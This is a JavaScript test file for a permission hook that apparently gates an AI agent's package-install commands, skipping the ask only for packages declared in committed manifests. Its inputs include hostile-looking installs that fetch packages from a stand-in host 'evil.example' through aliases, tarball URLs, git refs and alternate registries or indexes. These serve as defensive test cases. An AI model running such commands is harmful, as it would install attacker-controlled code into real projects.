// An install of a package the repo already declares (in the committed
// manifest) is no decision, so it doesn't ask. Anything else still does.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { hook, base } from './helpers.mjs';
import { tempRepo } from './verify.test.mjs';

const bash = (dir, command, extra = {}) => hook('pre-bash', base(dir, { tool_input: { command }, ...extra }));
const asked = (out) => out?.hookSpecificOutput?.permissionDecision === 'ask';

function npmRepo() {
  const { dir, g } = tempRepo();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({
    name: 'app', dependencies: { lodash: '^4' }, devDependencies: { vitest: '^3', '@types/node': '^22' },
    optionalDependencies: { fsevents: '*' }, peerDependencies: { react: '>=18' },
  }));
  g('add', '-A'); g('commit', '-qm', 'pkg');
  return { dir, g };
}

test('npm: installs of declared packages, in any of the four fields, do not ask', () => {
  const { dir } = npmRepo();
  for (const cmd of ['npm i lodash', 'npm install -D vitest@3', 'pnpm add @types/node@^22.1', 'yarn add react', 'bun add fsevents', 'npm i lodash vitest', 'npm i "lodash@~4.17"']) {
    assert.equal(bash(dir, cmd), null, cmd);
  }
});

test('npm: an undeclared package asks, and the ask names only the undeclared ones', () => {
  const { dir } = npmRepo();
  const out = bash(dir, 'npm i lodash left-padd');
  assert.ok(asked(out));
  assert.match(out.hookSpecificOutput.permissionDecisionReason, /left-padd/);
  assert.doesNotMatch(out.hookSpecificOutput.permissionDecisionReason, /lodash/);
});

test('npm: an alias, URL, git ref, tarball or path under a declared name still asks', () => {
  const { dir } = npmRepo();
  for (const cmd of ['npm i lodash@npm:evil-pkg', 'npm i lodash@https://evil.example/x.tgz', 'npm i github:evil/lodash', 'npm i lodash@git+ssh://evil/x', 'npm i lodash@file:../x', 'npm i evil/lodash']) {
    assert.ok(asked(bash(dir, cmd)), cmd);
  }
});

test('a name added to package.json but not committed still asks', () => {
  const { dir } = npmRepo();
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ dependencies: { lodash: '^4', 'evil-pkg': '1' } }));
  assert.ok(asked(bash(dir, 'npm i evil-pkg')));
});

test('the nearest package.json is the one read', () => {
  const { dir, g } = npmRepo();
  mkdirSync(join(dir, 'web'));
  writeFileSync(join(dir, 'web/package.json'), JSON.stringify({ dependencies: { astro: '^5' } }));
  g('add', '-A'); g('commit', '-qm', 'web');
  assert.equal(bash(dir, 'npm i astro', { cwd: join(dir, 'web') }), null);
  assert.ok(asked(bash(dir, 'npm i lodash', { cwd: join(dir, 'web') })), 'lodash is declared in the root, not in web/');
  assert.ok(asked(bash(dir, 'npm i astro')), 'astro is declared in web/, not in the root');
});

test('a package.json that does not parse declares nothing', () => {
  const { dir, g } = tempRepo();
  writeFileSync(join(dir, 'package.json'), '{ "dependencies": { "lodash": ');
  g('add', '-A'); g('commit', '-qm', 'bad');
  assert.ok(asked(bash(dir, 'npm i lodash')));
});

test('pip: requirements*.txt and pyproject.toml declare packages', () => {
  const { dir, g } = tempRepo();
  writeFileSync(join(dir, 'requirements.txt'), '# deps\nRequests>=2.0  # http\n-r other.txt\n');
  writeFileSync(join(dir, 'requirements-dev.txt'), 'pytest==8.1\n');
  writeFileSync(join(dir, 'pyproject.toml'), [
    '[project]', 'name = "myapp"', 'dependencies = [', '  "httpx[http2]>=0.27",', '  "pydantic",', ']',
    '[project.optional-dependencies]', 'docs = ["mkdocs>=1"]',
    '[dependency-groups]', 'lint = ["ruff"]',
    '[tool.poetry.dependencies]', 'python = "^3.12"', 'rich = "^13"',
    '[tool.poetry.group.dev.dependencies]', 'mypy = "*"',
  ].join('\n'));
  g('add', '-A'); g('commit', '-qm', 'py');
  for (const cmd of ['pip install requests', 'pip install pytest', 'pip3 install "httpx[http2]"', 'uv add pydantic>=2', 'pip install mkdocs', 'uv add ruff', 'poetry add rich', 'poetry add mypy', 'pip install Requests==2.32']) {
    assert.equal(bash(dir, cmd), null, cmd);
  }
  for (const cmd of ['pip install myapp', 'pip install python', 'pip install evil-pkg', 'pip install requests@https://evil.example/r.whl', 'pip install git+https://evil/requests']) {
    assert.ok(asked(bash(dir, cmd)), cmd);
  }
});

test('other ecosystems keep asking', () => {
  const { dir } = npmRepo();
  assert.ok(asked(bash(dir, 'cargo add lodash')));
});

test('a declared name fetched from another registry or index still asks', () => {
  const { dir, g } = npmRepo();
  writeFileSync(join(dir, 'requirements.txt'), 'requests\n');
  g('add', '-A'); g('commit', '-qm', 'req');
  for (const cmd of ['npm i lodash --registry https://evil.example', 'npm_config_registry=https://evil.example npm i lodash', 'pip install --index-url https://evil.example requests', 'pip install -i https://evil.example requests', 'pip install --extra-index-url https://evil.example requests', 'PIP_INDEX_URL=https://evil.example pip install requests', 'uv add --index https://evil.example requests', 'poetry add --source evil requests', 'pip install --find-links ./wheels requests']) {
    assert.ok(asked(bash(dir, cmd)), cmd);
  }
});
